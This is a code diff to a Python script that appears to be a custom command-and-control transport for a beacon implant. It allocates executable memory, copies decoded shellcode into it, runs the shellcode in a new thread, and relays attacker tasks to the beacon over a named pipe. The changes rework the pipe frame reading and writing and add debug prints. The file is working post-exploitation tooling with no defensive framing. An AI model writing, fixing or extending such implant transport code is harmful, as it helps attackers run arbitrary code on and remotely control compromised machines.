@@ -103,7 +103,7 @@ def start_beacon(payload):
                                        c_int(0x40)) # PAGE_EXECUTE_READWRITE
     LPTHREAD_START_ROUTINE = LPVOID # DEBUG
     memmove(ptr, buf, sizeof(buf))
-    windll.kernel32.CreateThread(None, 0, c_int(ptr), None, 0, None)
+    return windll.kernel32.CreateThread(None, 0, c_int(ptr), None, 0, None)
 
 # Open the handle to the pipe
 def open_handle():
@@ -124,49 +124,54 @@ def open_handle():
             break
     return pipe_handle
                                        
+
 def read_frame2(handle):
     mem = create_string_buffer(MAXLEN)
     temp = c_int(0)
     total = c_int(0)
     size = c_int(0)
-    #windll.kernel32.ReadFile(handle, mem, 4, byref(temp), None)
-    #windll.kernel32.ReadFile(handle, size, 4, byref(temp), None)
-    result, size = win32file.ReadFile(handle, 4, None)
-    size = struct.unpack('<I', size)[0]
-    sizeLeft = size
-    while (total.value < size):
-        # windll.kernel32.ReadFile(handle, mem, size - total, byref(temp), None)
-        windll.kernel32.ReadFile(handle, mem, sizeLeft, byref(temp), None)
-        sizeLeft = size - temp.value
-        # total += temp
-        total = c_long(total.value + temp.value)
+    windll.kernel32.ReadFile(handle, mem, 4, byref(size), None)
+    while (total < size.value):
+        windll.kernel32.ReadFile(handle, addressof(mem) + addressof(total), size.value - total.value, byref(temp), None)
+        total = total.value + temp.value
+        
     if size < 0: return (-1) # Nothing is in the pipe
-    print "size is now: " + str(sizeLeft)
-    chunk = mem.raw[:sizeLeft]
+    chunk = mem.raw[:temp.value]
     return chunk
 
 def read_frame(handle):
+    print "Handle is: %s" % (str(handle)) # DEBUG
+    print "Beacon_handle is %s" % (str(beacon_thread)) # DEBUG
     result, size = win32file.ReadFile(handle, 4, None)
     size = struct.unpack('<I', size)[0]
+    print "DEBUG: " + str(hex(size))
     result, chunk = win32file.ReadFile(handle, size, None)
     return chunk
 
 def ReadPipe(handle):
     return read_frame(handle)
 
-def write_frame2(handle, chunk, chunklen):
+def write_frame(handle, chunk):
     wrote = c_int(0)
-    windll.kernel32.WriteFile(handle, c_int(chunklen), 4, byref(wrote), None) # Write the size of the chunk
-    return windll.kernel32.WriteFile(handle, c_char_p(chunk), c_int(chunklen), byref(wrote), None) # Write the actual chunk
+    chunklen = c_int(len(chunk))
+    print "DEBUG: Lenght of packed chunk being sent using propersize is: " + str(chunklen)
+    print "DEBUG: Actual length of chunk using len(chunk) is: " + str(hex(len(chunk)))
+    windll.kernel32.WriteFile(handle, chunklen, 4, byref(wrote), None) # Write the size of the chunk
+    windll.kernel32.WriteFile(handle, c_char_p(chunk), chunklen, byref(wrote), None) # Write the actual chunk
+    return 0
 
-def write_frame(handle, chunk, chunklen):
-    propersize = struct.pack('<I', chunklen)[0]
+
+def write_frame2(handle, chunk):
+    propersize = struct.pack('<I', len(chunk))[0]
+    print "DEBUG: Lenght of packed chunk being sent using propersize is: " + str(propersize)
+    print "DEBUG: Actual length of chunk using len(chunk) is: " + str(hex(len(chunk)))
     win32file.WriteFile(handle, propersize, None)
-    return win32file.WriteFile(handle, chunk, None)
+    win32file.WriteFile(handle, chunk, None)
+    return 0
 
 def WritePipe(handle,chunk):
     print "Writing to pipe: %s" %(chunk)
-    return write_frame(handle, chunk, len(chunk))
+    return write_frame(handle, chunk)
 
 def go():
     # LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
@@ -176,8 +181,9 @@ def go():
     sleep(2)
     # print "Decoded stager = " + str(p) # DEBUG
     # Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
-    handle_beacon = start_beacon(p)
-
+    global beacon_thread # DEBUG
+    beacon_thread = start_beacon(p)
+    handle_beacon = open_handle()
     # Grabbing and relaying the metadata from the SMB pipe is done during interact()
     print "Loaded, and got handle to beacon. Getting METADATA."
 
@@ -205,11 +211,10 @@ def interact(handle_beacon):
 
             print "Got new task: %s" % (newTask)
             print "Writing %s bytes to pipe" % (len(newTask))
-            r = WritePipe(handle_beacon, newTask)
-            print "Write %s bytes to pipe" % (r)
+            WritePipe(handle_beacon, newTask)
     except KeyboardInterrupt:
-    print "Caught escape signal"
-    sys.exit(0)
+        print "Caught escape signal"
+        sys.exit(0)
 
 
 # Prepare the transport module
